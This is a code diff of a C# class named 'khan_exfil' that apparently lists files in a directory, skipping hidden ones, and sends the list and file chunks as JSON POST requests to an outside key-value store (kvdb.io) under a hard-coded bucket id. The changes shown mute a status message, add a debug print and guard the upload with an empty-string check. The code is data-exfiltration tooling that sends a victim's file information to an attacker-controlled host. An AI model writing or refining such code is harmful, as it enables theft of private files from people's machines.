@@ -27,7 +27,7 @@ public class khan_exfil
             		var uri = new Uri(endpoint);
            		    var response = client.UploadString(uri, "POST", json);
             		jsonResponse = response;
-					Console.WriteLine("Chunk written");
+					//Console.WriteLine("Chunk written");
 					WebHeaderCollection myWebHeaderCollection = client.ResponseHeaders;
        			 }
         	catch (WebException ex)
@@ -106,6 +106,7 @@ public class khan_exfil
 			}
 			else
 			{
+				Console.WriteLine("In else - Command of type path rec");
 				dirInf = new System.IO.DirectoryInfo(@path);
 				files = dirInf.GetFiles(file_details).Where(f => (f.Attributes & System.IO.FileAttributes.Hidden) != System.IO.FileAttributes.Hidden).ToArray().ToList();
 			}
@@ -137,10 +138,13 @@ public class khan_exfil
 					return;
 				}
 			}
+				if (master_files.Equals("")== false)
+				{
 			
 				string res="FQM3hbtRhm94tkaLXBm5kF";
 				string updated_ep="https://kvdb.io/"+res+"/master_files";
 				var res1=obj.PostRequestJson(updated_ep,master_files);
+				}
         }
         catch (UnauthorizedAccessException ex)
         {
